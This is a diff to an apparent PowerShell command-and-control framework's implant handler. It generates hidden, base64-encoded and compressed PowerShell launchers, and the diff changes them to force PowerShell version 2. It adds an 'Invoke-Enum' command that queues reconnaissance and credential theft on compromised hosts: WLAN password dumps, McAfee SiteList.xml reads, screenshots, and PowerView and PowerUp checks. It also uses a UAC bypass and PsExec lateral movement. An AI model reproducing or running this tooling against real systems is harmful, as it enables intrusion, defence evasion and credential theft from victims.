@@ -120,6 +120,7 @@ function Implant-Handler
         write-host " Hide-Implant"-ForegroundColor Green 
         write-host " Unhide-Implant"-ForegroundColor Green 
         write-host " Output-To-HTML"-ForegroundColor Green 
+        write-host " Invoke-Enum"-ForegroundColor Green 
         write-host " Get-Proxy"-ForegroundColor Green 
         write-host " Get-ComputerInfo"-ForegroundColor Green 
         write-host " Add-Creds -Username <Username> -Password <Pass> -Hash <Hash>"-ForegroundColor Green 
@@ -289,7 +290,7 @@ primer | iex }'
     function CreatePayload 
     {
         $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-        $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
+        $payloadraw = 'powershell -v 2 -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
         [IO.File]::WriteAllLines("$FolderPath\payloads\payload.bat", $payload)
 
@@ -346,7 +347,7 @@ start-sleep 10
 primer | iex
 }'
         $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-        $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+        $payloadraw = 'powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
         [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
         [IO.File]::WriteAllLines("$PoshPath\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
@@ -516,10 +517,10 @@ $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
 $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
 $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
 $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
-$startscript = "start-process `"powershell`" -argumentlist `"-exec bypass -Noninteractive -windowstyle hidden -c $NewScript`""
+$startscript = "start-process `"powershell`" -argumentlist `"-v 2 -exec bypass -Noninteractive -windowstyle hidden -c $NewScript`""
 
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
-$payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+$payloadraw = 'powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
 $payload = $payloadraw -replace "`n", ""
 [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
 Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
@@ -644,6 +645,9 @@ $header = '
   ============ @benpturner & @davehardy20 ============
   ====================================================
 </pre>'
+
+
+
 
 function runcommand {
 
@@ -793,7 +797,7 @@ param
                     CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                     $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                     $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
-                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
+                    $proxypayload = $proxypayload -replace "powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                     $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                     $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                     $CompressedStream = New-Object IO.MemoryStream
@@ -804,7 +808,7 @@ param
                     $CompressedStream.Dispose()
                     $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                     $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
-                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
+                    $pscommand = $pscommand + " -command `"powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                 } else {
                     write-host "Need to run CreateProxyPayload first"
                     $pscommand = 'fvdsghfdsyyh'
@@ -816,7 +820,7 @@ param
                     CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                     $proxypayload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                     $pscommand = $pscommand -replace 'Invoke-PsExecPayload', 'Invoke-PsExec'
-                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
+                    $proxypayload = $proxypayload -replace "powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                     $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                     $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                     $CompressedStream = New-Object IO.MemoryStream
@@ -827,7 +831,7 @@ param
                     $CompressedStream.Dispose()
                     $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                     $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
-                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
+                    $pscommand = $pscommand + " -command `"powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                 } else {
                     write-host "Can't find the payload.bat file, run CreatePayload first"
                     $pscommand = 'fvdsghfdsyyh'
@@ -1010,6 +1014,44 @@ param
             {
                 CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
             }
+            if ($pscommand.tolower().startswith('invoke-enum')) 
+            {
+                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
+                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
+                CheckModuleLoaded "PowerView.ps1" $psrandomuri
+                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
+                CheckModuleLoaded "POwerup.ps1" $psrandomuri
+                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
+                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
+                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Netstat -anp tcp; Netstat -anp udp; Net users; Net localgroup administrators; Net accounts; Net accounts dom;"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Get-Proxy; Invoke-allchecks; Get-MShotfixes"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Get-Firewallrulesall | out-string -width 200"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Get-Screenshot"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Get-WmiObject -Class Win32_Product"
+                } | Out-Null
+                
+                $pscommand = "Get-RecentFiles; Get-WLANPass"
+
+            }
             if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
             { 
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
@@ -1126,7 +1168,7 @@ param
                     CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                     $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                     $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
-                    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+                    $payloadraw = 'powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                     $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`"" 
                 } else {
                     write-host "Need to run CreateProxyPayload first"
@@ -1140,7 +1182,7 @@ param
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                 $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                 $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
-                $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+                $payloadraw = 'powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                 $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`""               
             } 
  
